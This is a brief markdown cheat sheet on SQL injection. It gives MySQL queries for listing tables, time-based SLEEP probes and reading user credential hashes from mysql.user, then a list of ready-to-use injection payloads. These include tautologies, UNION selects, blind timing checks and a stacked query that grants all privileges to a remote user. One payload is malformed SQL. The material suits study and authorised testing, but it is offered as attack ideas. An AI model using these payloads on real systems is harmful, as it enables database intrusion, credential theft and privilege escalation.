## SQL Injection Basics
```sql
-- Retrieve information about all the tables in a database. The information_schema is a system database that contains metadata about the database objects, such as tables, columns, and indexes.
SELECT * FROM information_schema.tables

-- Test sleeping
SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a') 

-- Incorporate unions to access more data
UNION

-- Return the columns user host auth from the database table: mysql.user. It is the user table of the mysql database
select user,host,authentication_string from mysql.user;
```

## Ideas for potential attacks
test' or 1=1;

test' union select null from mysql.tables;-- 

test' OR IF(1=1, SLEEP(5), 0);-- 

test' or 1=1;  grant all on user.* to 'test'@'%'; -- 

test' or if(1=1,(insert address FROM users),0); -- 